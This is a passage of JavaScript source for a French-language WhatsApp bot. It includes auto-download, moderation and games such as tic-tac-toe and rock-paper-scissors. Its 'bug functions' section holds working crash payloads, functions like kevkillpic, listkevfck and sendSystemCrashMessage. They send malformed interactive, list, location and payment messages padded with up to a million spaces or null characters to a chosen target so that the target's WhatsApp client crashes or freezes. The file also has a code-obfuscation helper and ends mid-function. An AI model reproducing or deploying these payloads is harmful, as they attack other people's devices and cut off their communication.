if (m.key.fromMe) return replygckev(bvl)
if (TontonKev) return replygckev(bvl)
               await Kev.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kev.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        
        //auto download #ctto
        if (db.settings[botNumber].autodownload && !m.key.fromMe) {
try {
if (budy.match(`instagram.com`)) {
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
Kev.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Telechargement Auto ✅`}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
Kev.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Telechargement Auto ✅`}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
Kev.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Telechargement Auto ✅`}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
Kev.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await Kev.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
		
		// Group Settings
		if (m.isGroup) {
			// Mute
			if (db.groups[m.chat].mute && !TontonKev) {
				return
			}
			
			// Anti Delete
			if (m.type == 'protocolMessage' && db.groups[m.chat].antidelete) {
				const mess = chatUpdate.messages[0].message.protocolMessage
				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Suppression❗*'}, ...chats.key }
					await Kev.relayMessage(m.chat, { [chats.type]: chats.msg }, {})
				}
			}
		}
		
		//user db //friend
        if (isCmd && !isUser) {
kevverifieduser.push(sender)
fs.writeFileSync('./recherche/user.json', JSON.stringify(kevverifieduser, null, 2))
}
		
		// Check Expiry
		prem.expiredCheck(Kev, premium);
		
		// TicTacToe
		let room = Object.values(game.tictactoe).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
		if (room) {
			let ok
			let isWin = !1
			let isTie = !1
			let isSurrender = !1
			if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
			isSurrender = !/^[1-9]$/.test(m.text)
			if (m.sender !== room.game.currentTurn) {
				if (!isSurrender) return !0
			}
			if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
				replygckev({
					'-3': 'The game is over',
					'-2': 'Invalid',
					'-1': 'Invalid Position',
					0: 'Invalid Position',
				}[ok])
				return !0
			}
			if (m.sender === room.game.winner) isWin = true
			else if (room.game.board === 511) isTie = true
			let arr = room.game.render().map(v => {
				return {
					X: '❌',
					O: '⭕',
					1: '1️⃣',
					2: '2️⃣',
					3: '3️⃣',
					4: '4️⃣',
					5: '5️⃣',
					6: '6️⃣',
					7: '7️⃣',
					8: '8️⃣',
					9: '9️⃣',
				}[v]
			})
			if (isSurrender) {
				room.game._currentTurn = m.sender === room.game.playerX
				isWin = true
			}
			let winner = isSurrender ? room.game.currentTurn : room.game.winner
			if (isWin) {
				global.db.users[m.sender].limit += 3
				global.db.users[m.sender].uang += 3000
			}
			let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\nType *surrender* to give up and admit defeat`
			if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
			room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
			if (room.x !== room.o) await Kev.sendMessage(room.x, { text: str, mentions: parseMention(str) }, { quoted: m })
			await Kev.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m })
			if (isTie || isWin) {
				delete game.tictactoe[room.id]
			}
		}
		
		// Suit PvP
		let roof = Object.values(game.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
		if (roof) {
			let win = ''
			let tie = false
			if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
					replygckev(`@${roof.p2.split`@`[0]} rejected the suit,\nsuit cancelled`)
					delete game.suit[roof.id]
					return !0
				}
				roof.status = 'play';
				roof.asal = m.chat;
				clearTimeout(roof.waktu);
				replygckev(`The suit has been sent to chat\n\n@${roof.p.split`@`[0]} dan @${roof.p2.split`@`[0]}\n\nPlease select a suit in the respective chat https://wa.me/${botNumber.split`@`[0]}`)
				if (!roof.pilih) Kev.sendMessage(roof.p, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
				if (!roof.pilih2) Kev.sendMessage(roof.p2, { text: `Please select \n\nRock🗿\nPaper📄\nScissors✂️` }, { quoted: m })
				roof.waktu_milih = setTimeout(() => {
					if (!roof.pilih && !roof.pilih2) replygckev(`Both players have no intention of playing,\nSuit cancelled`)
					else if (!roof.pilih || !roof.pilih2) {
						win = !roof.pilih ? roof.p2 : roof.p
						replygckev(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose a suit, the game ends`)
					}
					delete game.suit[roof.id]
					return !0
				}, roof.timeout)
			}
			let jwb = m.sender == roof.p
			let jwb2 = m.sender == roof.p2
			let g = /scissors/i
			let b = /rock/i
			let k = /paper/i
			let reg = /^(scissors|rock|paper)/i;
			
			if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
				roof.pilih = reg.exec(m.text.toLowerCase())[0];
				roof.text = m.text;
				replygckev(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`);
				if (!roof.pilih2) Kev.sendMessage(roof.p2, { text: '_The opponent has already chosen_\nNow it is your turn' })
			}
			if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
				roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
				roof.text2 = m.text
				replygckev(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
				if (!roof.pilih) Kev.sendMessage(roof.p, { text: '_The opponent has already chosen_\nNow it is your turn' })
			}
			let stage = roof.pilih
			let stage2 = roof.pilih2
			if (roof.pilih && roof.pilih2) {
				clearTimeout(roof.waktu_milih)
				if (b.test(stage) && g.test(stage2)) win = roof.p
				else if (b.test(stage) && k.test(stage2)) win = roof.p2
				else if (g.test(stage) && k.test(stage2)) win = roof.p
				else if (g.test(stage) && b.test(stage2)) win = roof.p2
				else if (k.test(stage) && b.test(stage2)) win = roof.p
				else if (k.test(stage) && g.test(stage2)) win = roof.p2
				else if (stage == stage2) tie = true
				global.db.users[roof.p == win ? roof.p : roof.p2].limit += tie ? 0 : 3
				global.db.users[roof.p == win ? roof.p : roof.p2].uang += tie ? 0 : 3000
				Kev.sendMessage(roof.asal, { text: `_*Suit Results*_${tie ? '\nSERIES' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}\n\nWinner Gets\n*Present :* Money(3000) & Limit(3)`.trim(), mentions: [roof.p, roof.p2] }, { quoted: m })
				delete game.suit[roof.id]
			}
		}
		
		// Guess Bomb
		let pilih = '🌀', bomb = '💣';
		if (m.sender in game.tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				game.tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				game.tebakbom[m.sender].pick++;
				Kev.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
				game.tebakbom[m.sender].bomb--;
				game.tebakbom[m.sender].nyawa.pop();
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].nyawa.length < 1) {
					global.db.users[m.sender].limit -= 1
					await replygckev(`*THE GAME IS OVER*\nYou were hit by a bomb\n\n ${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n_Limit Reduction : 1_`);
					Kev.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
					delete game.tebakbom[m.sender];
				} else await replygckev(`*SELECT A NUMBER*\n\nYou were hit by a bomb\n ${brd.join('')}\n\nSelected: ${game.tebakbom[m.sender].pick}\nRemaining life: ${game.tebakbom[m.sender].nyawa}`);
				return !0;
			}
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				game.tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				game.tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				game.tebakbom[m.sender].pick++;
				game.tebakbom[m.sender].lolos--;
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].lolos < 1) {
					global.db.users[m.sender].limit += 3
					global.db.users[m.sender].uang += 3000
					await replygckev(`*YOU ARE GREAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n*Remaining life :* ${game.tebakbom[m.sender].nyawa}\n*Bomb :* ${game.tebakbom[m.sender].bomb}\n*Present :* Money(3000) & Limit(3)`);
					delete game.tebakbom[m.sender];
				} else replygckev(`*SELECT A NUMBER*\n\n${brd.join('')}\n\nSelected : ${game.tebakbom[m.sender].pick}\nRemaining life : ${game.tebakbom[m.sender].nyawa}\nBomb : ${game.tebakbom[m.sender].bomb}`)
			}
		}
		
		// Math
		if (game.kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = game.kuismath[m.sender.split('@')[0]].jawaban
			const difficultyMap = { 'noob': 1, 'easy': 2, 'medium': 3, 'hard': 4, 'extreme': 5, 'impossible': 6, 'impossible2': 7 };
			let hasilLimit = difficultyMap[game.kuismath[m.sender.split('@')[0]].mode]
			if (isNaN(budy)) return
			if (budy.toLowerCase() == jawaban) {
				global.db.users[m.sender].limit += hasilLimit
				global.db.users[m.sender].uang += hasilLimit * 1000
				await replygckev(`🎮 Math Quiz  🎮\n\nCorrect answer 🎉\nYou Get a Limit *${hasilLimit}*\n\nWant to play again? Send ${prefix}math mode`)
				delete game.kuismath[m.sender.split('@')[0]]
			} else replygckev('*Wrong answer!*')
		}
		
		// Menfes
		if (!m.isGroup) {
			if (game.menfes[m.sender] && m.key.remoteJid !== 'status@broadcast') {
				if (!/^del(menfe(s|ss)|confe(s|ss))$/i.test(command)) {
					m.msg.contextInfo = { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}
					const pesan = m.type === 'conversation' ? { extendedTextMessage: { text: m.msg, contextInfo: { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}}} : { [m.type]: m.msg }
					await Kev.relayMessage(game.menfes[m.sender].tujuan, pesan, {});
				}
			}
		}
		
		// Afk
		let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
		for (let jid of mentionUser) {
			let user = global.db.users[jid]
			if (!user) continue
			let afkTime = user.afkTime
			if (!afkTime || afkTime < 0) continue
			let reason = user.afkReason || ''
			replygckev(`Don't tag him!\nHe's AFK ${reason ? 'with reason ' + reason : 'no reason'}\nDuring ${clockString(new Date - afkTime)}`.trim())
		}
		if (global.db.users[m.sender].afkTime > -1) {
			let user = global.db.users[m.sender]
			replygckev(`@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' after ' + user.afkReason : ''}\nDuring ${clockString(new Date - user.afkTime)}`)
			user.afkTime = -1
			user.afkReason = ''
		}
		
		//reply
        async function replygckev(teks) {
            if (typereply === 's1') {
                replygckev(teks)
            } else if (typereply === 's2') {
                Kev.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 's3') {
               Kev.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            } else if (typereply === 's4') {
                replygckev2(teks)
            }
        }
        
//fake reply with channel link embedded
async function replygckev2(txt) {
const kevnewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "la purge dans l ame",
newsletterJid: global.xchannel.jid,
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
sourceUrl: websitex
},
},
text: txt,
}
return Kev.sendMessage(m.chat, kevnewrep, {
quoted: m,
})
}

//premium
        async function replyprem(teks) {
    replygckev(`Cette commande est reservee aux boss, veuillez contacter le proprio pour en devenir un`)
}

//script replier
        async function sendKevMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Kev.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//theme sticker reply
        const KevStickWait = () => {
        let KevStikRep = fs.readFileSync('./KevFile/theme/sticker_reply/wait.webp')
        Kev.sendMessage(m.chat, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickAdmin = () => {
        let KevStikRep = fs.readFileSync('./KevFile/theme/sticker_reply/admin.webp')
        Kev.sendMessage(m.chat, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickBotAdmin = () => {
        let KevStikRep = fs.readFileSync('./KevFile/theme/sticker_reply/botadmin.webp')
        Kev.sendMessage(m.chat, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickOwner = () => {
        let KevStikRep = fs.readFileSync('./KevFile/theme/sticker_reply/owner.webp')
        Kev.sendMessage(m.chat, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickGroup = () => {
        let KevStikRep = fs.readFileSync('./KevFile/theme/sticker_reply/group.webp')
        Kev.sendMessage(m.chat, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickPrivate = () => {
        let KevStikRep = fs.readFileSync('./KevFile/theme/sticker_reply/private.webp')
        Kev.sendMessage(m.chat, { sticker: KevStikRep }, { quoted: m })
        }
        
//time
const kevjour = moment.tz('Africa/Abidjan').locale('en-IN').format('dddd');
const kevdate = moment.tz('Africa/Abidjan').locale('en-IN').format('DD/MM/YYYY');
const kevheure = moment().tz('Africa/Abidjan').locale('en-IN').format('HH:mm:ss');
const time2 = moment().tz('Africa/Abidjan').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var Kevinoutimewisher = `Douce Nuit 🌌`
 }
 if(time2 < "19:00:00"){
var Kevinoutimewisher = `Bonsoir  🌃`
 }
 if(time2 < "18:00:00"){
var Kevinoutimewisher = `Bonsoir  🌃`
 }
 if(time2 < "15:00:00"){
var Kevinoutimewisher = `Bon Aprem 🌅`
 }
 if(time2 < "11:00:00"){
var Kevinoutimewisher = `Bonjour 🌄`
 }
 if(time2 < "05:00:00"){
var Kevinoutimewisher = `Bonjour 🌄`
 } 

//theme txt
let setv = pickRandom(global.listv)

//autoreply
for (let BhosdikaKev of VoiceNoteKev) {
if (budy === BhosdikaKev) {
let audiobuffy = fs.readFileSync(`./KevFile/audio/${BhosdikaKev}.mp3`)
Kev.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaKev of StickerKev){
if (budy === BhosdikaKev){
let stickerbuffy = fs.readFileSync(`./KevFile/sticker/${BhosdikaKev}.webp`)
Kev.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaKev of ImageKev){
if (budy === BhosdikaKev){
let imagebuffy = fs.readFileSync(`./KevFile/image/${BhosdikaKev}.jpg`)
Kev.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaKev of VideoKev){
if (budy === BhosdikaKev){
let videobuffy = fs.readFileSync(`./KevFile/video/${BhosdikaKev}.mp4`)
Kev.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
Kev.sendMessage(m.chat, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaKev of ApkKev) {
if (budy === BhosdikaKev) {
let buffer = fs.readFileSync(`./KevFile/apk/${BhosdikaKev}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
Kev.sendMessage(m.chat, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaKev of ZipKev) {
if (budy === BhosdikaKev) {
let buffer = fs.readFileSync(`./KevFile/zip/${BhosdikaKev}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
Kev.sendMessage(m.chat, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaKev of DocKev) {
if (budy === BhosdikaKev) {
let buffer = fs.readFileSync(`./KevFile/doc/${BhosdikaKev}.pdf`)
senddocu(buffer)
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

// Response Addlist
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Kev.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Kev.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: Kev.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Kev.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
Kev.ev.emit('messages.upsert', msg)
} 

//======bug functions========\\
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./KevBugFonc/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🍁Kev 🍁Kev 🍁Kev\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./KevBugFonc/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🍁Kev 🍁Kev 🍁Kev\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickkev = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🍁Kev`
}
}
}

const sendReaction = async reactionContent => {
  Kev.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await Kev.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationKevinou(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🍁Kev 🍁Kev 🍁Kev`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Kev.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function kevkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🍁Kev",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg" } }, { upload: Kev.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🍁Kev"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await Kev.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await Kev.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listkevfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🍁Kev"+" ".repeat(920000),
        'footerText': `🍁Kev 🍁Kev 🍁Kev`,
        'description': `🍁Kev 🍁Kev 🍁Kev`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickkev });
await Kev.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   Kev.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    Kev.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await Kev.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
